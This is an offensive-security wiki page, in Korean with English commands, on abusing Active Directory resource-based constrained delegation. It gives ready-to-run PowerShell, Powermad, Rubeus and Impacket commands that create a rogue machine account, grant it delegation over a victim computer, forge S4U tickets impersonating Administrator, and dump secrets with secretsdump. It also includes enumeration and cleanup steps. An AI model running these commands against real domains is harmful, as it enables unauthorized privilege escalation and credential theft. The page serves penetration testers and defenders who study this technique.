# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

이는 기본 [Constrained Delegation](constrained-delegation.md)와 유사하지만 **대신** 권한을 **객체**에 주어 **머신에 대해 어떤 사용자를 가장(impersonate)하도록 하는 것**이 아니라, Resource-based Constrain Delegation은 **어떤 사용자가 그 객체를 상대로 어떤 사용자든 가장할 수 있는지를 객체 자체에 설정**합니다.

이 경우, 제약된 객체는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성을 가지며, 그 속성에 그 객체를 상대로 어떤 사용자든 가장할 수 있는 사용자의 이름이 들어갑니다.

이 Constrained Delegation과 다른 Delegation 들의 또 다른 중요한 차이점은 **machine account에 대한 쓰기 권한**을 가진 어떤 사용자든 (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** 를 설정할 수 있다는 점입니다 (다른 형태의 Delegation에서는 도메인 관리자 권한이 필요했습니다).

### New Concepts

Constrained Delegation에서는 사용자 _userAccountControl_ 값 내의 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하는 데 필요하다고 알려져 있었습니다. 하지만 그건 완전한 사실이 아닙니다.  
실제로는 해당 값이 없어도, 당신이 **서비스**(SPN을 가진 경우)라면 어떤 사용자에 대해서도 **S4U2Self**를 수행할 수 있습니다. 다만, 만약 당신이 **`TrustedToAuthForDelegation`**을 가지고 있다면 반환되는 TGS는 **Forwardable**하고, 그 플래그가 없다면 반환되는 TGS는 **Forwardable하지 않습니다**.

하지만 S4U2Proxy에서 사용된 **TGS**가 **NOT Forwardable**인 경우 기본 Constrain Delegation을 악용하려 해도 **작동하지 않습니다**. 그러나 Resource-based constrain delegation을 악용하는 경우에는 **작동합니다**.

### Attack structure

> 만약 당신이 **Computer** 계정에 대해 **write equivalent privileges**를 가지고 있다면 해당 머신에서 **privileged access**를 얻을 수 있습니다.

공격자가 이미 **피해자 컴퓨터에 대한 쓰기 동등 권한(write equivalent privileges)**을 가지고 있다고 가정합시다.

1. 공격자는 **SPN**을 가진 계정을 **침해하거나** 또는 **하나를 생성**합니다(“Service A”). 추가 권한이 없는 **_Admin User_**라면 누구든지 최대 10개의 Computer 객체를 생성(**_MachineAccountQuota_**)하고 SPN을 설정할 수 있다는 점에 유의하세요. 따라서 공격자는 단순히 Computer 객체를 생성하고 SPN을 설정할 수 있습니다.
2. 공격자는 피해자 컴퓨터(ServiceB)에 대한 자신의 WRITE 권한을 악용하여 resource-based constrained delegation을 구성하고 ServiceA가 해당 피해자 컴퓨터(ServiceB)를 상대로 어떤 사용자든 가장하도록 허용합니다.
3. 공격자는 Rubeus를 사용해 Service A에서 Service B로 특정 사용자를 대상으로 **full S4U attack**(S4U2Self 및 S4U2Proxy)을 수행합니다. 대상 사용자는 **Service B에 대한 privileged access**를 가진 사용자입니다.
1. S4U2Self (SPN을 침해/생성한 계정에서): 자신에게 대한 **Administrator의 TGS**를 요청합니다(Forwardable 아님).
2. S4U2Proxy: 이전 단계에서 얻은 **not Forwardable TGS**를 사용해 **Administrator**로부터 **victim host**를 대상으로 하는 **TGS**를 요청합니다.
3. not Forwardable TGS를 사용하더라도, Resource-based constrained delegation을 악용하고 있으므로 작동합니다.
4. 공격자는 **pass-the-ticket** 및 **impersonate**를 통해 사용자를 가장하여 **피해 ServiceB에 대한 접근**을 얻을 수 있습니다.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 객체 생성

도메인 내부에 컴퓨터 객체를 생성하려면 **[powermad](https://github.com/Kevin-Robertson/Powermad):** 를 사용할 수 있습니다
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation 구성

**activedirectory PowerShell module 사용**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview 사용하기**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 완전한 S4U attack 수행 (Windows/Rubeus)

먼저, 우리는 `123456` password로 새 Computer object를 생성했으므로, 해당 password의 hash가 필요합니다:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이 명령은 해당 계정의 RC4 및 AES hashes를 출력합니다.
이제 attack을 수행할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus의 `/altservice` 파라미터를 사용하면 한 번의 요청으로 더 많은 서비스에 대한 티켓을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 사용자는 "**Cannot be delegated**"라는 속성을 가지고 있다는 점을 유의하세요. 사용자의 해당 속성이 True인 경우, 해당 사용자를 impersonate할 수 없습니다. 이 속성은 bloodhound에서 확인할 수 있습니다.

### Linux 도구: end-to-end RBCD with Impacket (2024+)

Linux에서 작업하는 경우, 공식 Impacket 도구를 사용하여 전체 RBCD 체인을 수행할 수 있습니다:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
- Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### 접근

마지막 명령줄은 Administrator에서 피해자 호스트의 **메모리**로 **완전한 S4U attack을 수행하고 TGS를 주입합니다**.\
이 예에서는 Administrator로부터 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
```bash
ls \\victim.domain.local\C$
```
### 다양한 서비스 티켓 악용

자세한 내용은 [**available service tickets here**](silver-ticket.md#available-services)에서 확인하세요.

## 열거, 감사 및 정리

### RBCD가 구성된 컴퓨터 열거

PowerShell (SD를 디코딩하여 SIDs를 해석):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (한 명령으로 read 또는 flush):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD 정리/재설정

- PowerShell (속성 지우기):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 kerberos가 DES나 RC4를 사용하지 않도록 구성되어 있고 당신은 RC4 해시만 제공하고 있다는 뜻입니다. Rubeus에 최소한 AES256 해시를 제공하세요(또는 rc4, aes128, aes256 해시를 모두 제공). 예시: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: 이는 현재 컴퓨터의 시간이 DC의 시간과 달라 kerberos가 제대로 작동하지 않는다는 뜻입니다.
- **`preauth_failed`**: 주어진 username + hashes로 로그인이 되지 않는다는 뜻입니다. 해시를 생성할 때 사용자 이름에 "$"를 넣는 것을 잊었을 수 있습니다(`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: 이는 다음을 의미할 수 있습니다:
  - 당신이 가장하려는 사용자가 원하는 서비스에 접근할 수 없습니다(당신이 그것을 가장할 수 없거나 충분한 권한이 없기 때문).
  - 요청한 서비스가 존재하지 않습니다(예: winrm에 대한 티켓을 요청했지만 winrm이 실행 중이지 않은 경우).
  - 생성한 fakecomputer가 취약한 서버에 대한 권한을 잃었고 권한을 다시 부여해야 합니다.
  - 당신이 고전적인 KCD를 남용하고 있습니다; RBCD는 non-forwardable S4U2Self 티켓으로 작동하는 반면 KCD는 forwardable을 요구한다는 점을 기억하세요.

## Notes, relays and alternatives

- LDAP가 필터링된 경우 AD Web Services (ADWS)를 통해 RBCD SD를 쓸 수도 있습니다. 자세한 내용은 다음을 참조하세요:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos 릴레이 체인은 종종 한 단계로 local SYSTEM을 얻기 위해 RBCD로 끝납니다. 실무적인 엔드투엔드 예시는 다음을 참조하세요:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding이 **disabled**되어 있고 머신 계정을 생성할 수 있다면, KrbRelayUp 같은 도구가 강제된 Kerberos 인증을 LDAP로 릴레이하고 대상 컴퓨터 객체의 머신 계정에 대해 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정한 뒤, 오프호스트에서 S4U를 통해 즉시 **Administrator**로 가장할 수 있습니다.

## 참고자료

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 최근 문법을 반영한 빠른 Linux cheatsheet: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
